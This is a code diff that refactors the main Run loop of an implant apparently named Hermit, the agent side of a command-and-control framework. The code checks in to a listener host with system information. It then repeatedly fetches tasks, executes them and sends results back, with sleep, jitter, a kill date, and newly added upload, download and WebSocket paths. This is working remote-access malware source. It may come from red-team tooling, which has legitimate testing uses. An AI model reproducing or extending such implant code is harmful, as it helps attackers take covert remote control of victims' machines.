@@ -5,92 +5,76 @@ namespace Hermit
 	BOOL Run(
 		HINSTANCE       hInstance,
 		INT 			nCmdShow,
+		LPCWSTR			lpPayloadType,
+		LPCWSTR			lpProtocol,
 		LPCWSTR 		lpHost,
 		INTERNET_PORT 	nPort,
-		LPCWSTR 		lpRequestCheckInPath,
-		LPCWSTR 		lpRequestTaskGetPath,
-		LPCWSTR 		lpRequestTaskResultPath,
+		LPCWSTR 		lpReqPathCheckIn,
+		LPCWSTR			lpReqPathDownload,
+		LPCWSTR 		lpReqPathTaskGet,
+		LPCWSTR 		lpReqPathTaskResult,
+		LPCWSTR			lpReqPathUpload,
+		LPCWSTR			lpReqPathWebSocket,
 		INT 			nSleep,
 		INT				nJitter,
 		INT				nKillDate
 	) {
-		BOOL bResults = FALSE;
-
-		HINTERNET hSession = NULL;
-		HINTERNET hConnect = NULL;
-		HINTERNET hRequest = NULL;
-		BOOL bCheckIn = FALSE;
-		BOOL bQuit = FALSE;
+		State::StateManager sm;
+		sm.SetHInstance(hInstance);
+		sm.SetCmdShow(nCmdShow);
+		sm.SetPayloadType(lpPayloadType);
+		sm.SetListenerProtocol(lpProtocol);
+		sm.SetListenerHost(lpHost);
+		sm.SetListenerPort(nPort);
+		sm.SetReqPathCheckIn(lpReqPathCheckIn);
+		sm.SetReqPathDownload(lpReqPathDownload);
+		sm.SetReqPathTaskGet(lpReqPathTaskGet);
+		sm.SetReqPathTaskResult(lpReqPathTaskResult);
+		sm.SetReqPathUpload(lpReqPathUpload);
+		sm.SetReqPathWebSocket(lpReqPathWebSocket);
+		sm.SetSleep(nSleep);
+		sm.SetJitter(nJitter);
+		sm.SetKillDate(nKillDate);
+		sm.SetHSession(NULL);
+		sm.SetHConnect(NULL);
+		sm.SetHRequest(NULL);
+		sm.SetQuit(FALSE);
 
 		// Get initial system info for sending it when check-in
-		std::wstring infoJson = Handler::GetInitialInfo();
+		std::wstring infoJson = Handler::GetInitialInfo(sm);
 
-		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
-			lpHost,
-			nPort
-		);
-		if (!handlers.hSession || !handlers.hConnect) {
-			System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
+		Handler::InitHTTP(sm);
+		if (sm.GetHSession() == NULL || sm.GetHConnect() == NULL)
+		{
+			Handler::CloseHTTP(sm);
 			return FALSE;
 		}
-
-		hSession = handlers.hSession;
-		hConnect = handlers.hConnect;
 
 		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);
 
 		// Check in
 		do
 		{
-			SLEEP(nSleep);
+			Sleep(sm.GetSleep() * 1000);
 
-			bCheckIn = Handler::CheckIn(
-				hConnect,
-				lpHost,
-				nPort,
-				lpRequestCheckInPath,
-				infoJson
-			);
-		} while (!bCheckIn);
+			if (Handler::CheckIn(sm, infoJson))
+				break;
+		} while (1 == 1);
 
-		// Get and execute tasks
+		// Get/Execute/Send tasks
 		do
 		{
-			SLEEP(nSleep);
+			Sleep(sm.GetSleep() * 1000);
 
-			std::wstring task = Handler::GetTask(
-				hConnect,
-				lpHost,
-				nPort,
-				lpRequestTaskGetPath
-			);
-
-			std::wstring taskResult = Handler::ExecuteTask(
-				hInstance,
-				nCmdShow,
-				hConnect,
-				task,
-				nSleep
-			);
-			if (wcscmp(taskResult.c_str(), L"") == 0)
-			{
+			if (!Handler::GetTask(sm))
 				continue;
-			}
 
-			bResults = Handler::SendTaskResult(
-				hConnect,
-				lpHost,
-				nPort,
-				lpRequestTaskResultPath,
-				task,
-				taskResult
-			);
-			if (!bResults) {
-				continue;
-			}
-		} while (bQuit == FALSE);
+			Handler::ExecuteTask(sm);
+			Handler::SendTaskResult(sm);
+		} while (!sm.GetQuit());
 
-		System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
+		Handler::CloseHTTP(sm);
+		
 		return TRUE;
 	}
 }
